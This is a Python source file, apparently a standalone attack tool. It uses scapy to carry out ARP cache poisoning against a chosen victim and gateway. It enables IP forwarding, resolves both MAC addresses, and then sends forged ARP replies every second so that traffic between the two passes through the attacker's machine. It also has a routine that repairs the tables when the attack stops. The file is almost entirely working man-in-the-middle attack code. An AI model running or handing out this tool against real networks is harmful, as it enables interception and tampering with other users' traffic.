import time

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.sendrecv import sendp, send
from scapy import route
import os

#Method to enable ipv4 port forwarding (if it is disabled)
def enable_ipforwarding():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        f.write('1')


class ARPoison:

    running = True
    victim_ip = ''
    victim_mac = ''
    gateway_ip = ''
    gateway_mac = ''
    interface = conf.iface
    counter = 0


    def __init__(self, tgt_ip, gw_ip):
        self.victim_ip = tgt_ip
        self.gateway_ip = gw_ip
        enable_ipforwarding()


    def set_MACs(self):
        self.victim_mac = getmacbyip(self.victim_ip)
        self.gateway_mac = getmacbyip(self.gateway_ip)


    def start(self):
        self.set_MACs()
        print("Started ARP poisoning attack")
        self.arp_poison()


    def repair_tables(self):
        send( ARP( op=2, hwdst=self.victim_mac, pdst=self.victim_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip ), verbose=False, count=3 )
        send( ARP( op=2, hwdst=self.gateway_mac, pdst=self.gateway_ip, hwsrc=self.victim_mac, psrc=self.victim_ip ), verbose=False, count=3 )
        print("ARP tables of the gateway and victim repaired")

    def stop(self):
        self.running = False
        self.repair_tables()
        print("Stopped ARP poisoning attack, sent " + str(self.counter) + " ARP packets")

    def arp_poison(self):
        
        try:
            print("Trying to get MAC addresses...")
            att_mac = get_if_hwaddr(self.interface)

            while ((self.gateway_mac is None) or (self.victim_mac is None)) and self.running:

                #If victim mac not set, try to set it again
                if self.victim_mac is None:
                    self.victim_mac = getmacbyip(self.victim_ip)

                #if gateway mac is not set, try to set if afain
                if self.gateway_mac is None:
                    self.gateway_mac = getmacbyip(self.gateway_ip)
                time.sleep(1)

                print("Could not find both of them, trying again...")

            print("Gateway MAC address: " + str(self.gateway_mac))
            print("victim MAC address: " + str(self.victim_mac))



            poison_victim = Ether() / ARP()
            poison_victim[Ether].src = att_mac
            poison_victim[ARP].hwsrc = att_mac
            poison_victim[ARP].psrc = self.gateway_ip
            poison_victim[ARP].hwdst = self.victim_mac
            poison_victim[ARP].pdst = self.victim_ip
            poison_victim[ARP].op = 2



            poison_gateway = Ether() / ARP()
            poison_gateway[Ether].src = att_mac
            poison_gateway[ARP].hwsrc = att_mac
            poison_gateway[ARP].psrc = self.victim_ip
            poison_gateway[ARP].hwdst = self.gateway_mac
            poison_gateway[ARP].pdst = self.gateway_ip
            poison_gateway[ARP].op = 2




            while self.running:
                sendp(poison_victim, iface=self.interface, verbose=False)
                sendp(poison_gateway, iface=self.interface, verbose=False)
                time.sleep(1)
                self.counter = self.counter + 2



        except KeyboardInterrupt:
            self.stop()

    